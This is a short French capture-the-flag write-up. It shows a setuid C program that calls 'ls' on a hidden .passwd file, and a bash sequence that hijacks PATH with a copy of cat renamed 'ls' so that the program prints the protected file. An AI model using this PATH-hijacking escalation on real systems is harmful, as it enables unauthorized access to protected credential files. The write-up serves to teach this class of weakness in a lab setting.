# Contournement des droits

Dans cet exemple, nous avons une machine où nous cherchons à trouver un fichier caché contenant un flag.

```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}

```

Nous avons accès à ce fichier, nous l'exécutons et remarquons qu'il effectue une commande 'ls' qui indique le chemin du fichier.

Nous ne pouvons pas utiliser la commande "cat" sur le fichier caché.

Nous pouvons donc suivre les étapes suivantes :

```bash
mkdir /tmp/vuln
cp /bin/cat /tmp/vuln/
mv /tmp/vuln/cat /tmp/vuln/ls
export PATH=/tmp/vuln:$PATH
echo $PATH

```

Nous créons un dossier dans /tmp/, copions le fichier de la commande "cat", le renommons en "ls", puis modifions le chemin pour l'exécution.

Il suffit ensuite d'exécuter le script pour voir le contenu du fichier.
